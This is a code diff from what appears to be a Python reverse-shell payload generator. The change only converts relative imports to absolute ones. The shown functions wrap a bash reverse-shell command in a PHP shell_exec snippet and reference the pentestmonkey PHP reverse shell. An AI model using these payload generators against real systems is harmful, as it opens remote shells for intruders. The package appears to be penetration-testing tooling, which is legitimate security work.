@@ -1,12 +1,12 @@
 __all__ = ['reverse_bash', 'pentestmonkey']
 
-from ...cmd.unix import reverse_bash as bash_cmd
-from ...util import kwdefaults_from
+from revshell.cmd.unix import reverse_bash as bash_cmd
+from revshell.util import kwdefaults_from
 
 
 @kwdefaults_from(bash_cmd)
 def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
-    from .. import php_adapter
+    from revshell.php import php_adapter
 
     return php_adapter(
         "<pre><?= shell_exec({!p}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
@@ -24,7 +24,7 @@ def pentestmonkey(
     References:
         https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
     """
-    from .. import php_escape
+    from revshell.php import php_escape
 
     shell_cmd = shell_cmd or "/bin/sh"
     debug = int(debug)
